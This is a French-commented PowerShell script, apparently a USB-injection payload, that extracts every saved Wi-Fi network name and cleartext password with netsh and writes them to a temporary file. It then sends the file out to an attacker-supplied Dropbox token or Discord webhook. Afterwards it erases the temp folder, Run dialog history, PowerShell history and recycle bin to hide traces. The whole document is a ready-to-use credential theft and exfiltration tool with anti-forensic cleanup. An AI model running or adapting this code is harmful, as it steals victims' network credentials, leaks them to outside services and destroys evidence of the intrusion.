############################################################################################################################################################

# Récupération des profils Wi-Fi et des mots de passe
$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Contenu de la clé\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String

# Sauvegarde des mots de passe dans un fichier temporaire
$wifiProfiles > $env:TEMP/--wifi-pass.txt

############################################################################################################################################################

# Fonction pour télécharger vers Dropbox
function DropBox-Upload {
    [CmdletBinding()]
    param (
        [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
        [Alias("f")]
        [string]$SourceFilePath
    )
    $outputFile = Split-Path $SourceFilePath -leaf
    $TargetFilePath="/$outputFile"
    $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
    $authorization = "Bearer " + $db
    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $headers.Add("Authorization", $authorization)
    $headers.Add("Dropbox-API-Arg", $arg)
    $headers.Add("Content-Type", 'application/octet-stream')
    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}

# Upload vers Dropbox si le jeton est renseigné
if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $env:TEMP/--wifi-pass.txt}

############################################################################################################################################################

# Fonction pour télécharger vers Discord
function Upload-Discord {
    [CmdletBinding()]
    param (
        [parameter(Position=0, Mandatory=$False)]
        [string]$file,
        [parameter(Position=1, Mandatory=$False)]
        [string]$text 
    )

    $hookurl = "$dc"

    $Body = @{
        'username' = $env:username
        'content' = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))){
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
    }

    if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}

# Upload vers Discord si le webhook est renseigné
if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TEMP/--wifi-pass.txt"}

############################################################################################################################################################

# Fonction pour nettoyer les traces après l'exfiltration
function Clean-Exfil { 
    # Vide le dossier temporaire
    rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

    # Supprime l'historique de la boîte de dialogue Exécuter
    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

    # Supprime l'historique de PowerShell
    Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue

    # Vide la corbeille
    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
}

############################################################################################################################################################

# Nettoie les traces si la variable $ce est définie
if (-not ([string]::IsNullOrEmpty($ce))){Clean-Exfil}

# Supprime le fichier temporaire contenant les mots de passe
RI $env:TEMP/--wifi-pass.txt
